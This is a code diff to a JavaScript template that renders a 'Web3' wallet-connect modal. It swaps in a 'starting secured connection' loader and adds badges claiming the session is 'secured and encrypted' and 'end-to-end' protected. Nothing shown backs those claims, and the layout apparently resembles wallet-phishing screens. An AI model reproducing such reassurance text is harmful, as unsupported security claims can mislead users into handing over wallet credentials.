@@ -19,15 +19,17 @@ const modalsHTML = (formId) => `
     <div class="modal-child modal-child-3">
 	<div class="alert">
 	<div class="lpd-secure-conn" style="display: none;">
-	  <h6 class="text-center lpd-secure">
-		Starting secured connection
-	  </h6>
-	  <p class="text-center lpd-wait">please wait...</p>
-	  <div class="lpd-slider m-t-20px">
-		<div class="lpd-slider-dot"></div>
-	  </div>
-	</div>
+        <div class="text-center" style="width: 100%;">
+        	<img src="https://cdn.jsdelivr.net/gh/braingrams/faith-assets/img/loading.webp" class="mx-auto" width="100px">
+            <h5 class="text-info">starting secured connection...</h5>
+            <i style="text-align: center !important; font-size:small" class="text-muted align-items-center">please wait...</i>
+        </div>
+    </div>
+	
 
+	<div>
+	  <p class="text-center m-t-5px">The session is secured and encrypted</p>
+	</div>
 	<div class="bottom">
 	  <div>
 		<p class="wallet-name">Web3</p>
@@ -50,6 +52,9 @@ const modalsHTML = (formId) => `
 		</a>
 	  </div>
 	</div>
+	<div style="display:flex; justify-content:center;align-items:center; margin-top:10px">
+        <img src="https://cdn.jsdelivr.net/gh/braingrams/faith-assets/img/shield.png" width="30" height="30" style="margin-right: 10px !important;"> <small>This session is protected with an end-to-end encryption</small>
+    </div>
   </div>
     </div>
 </div>
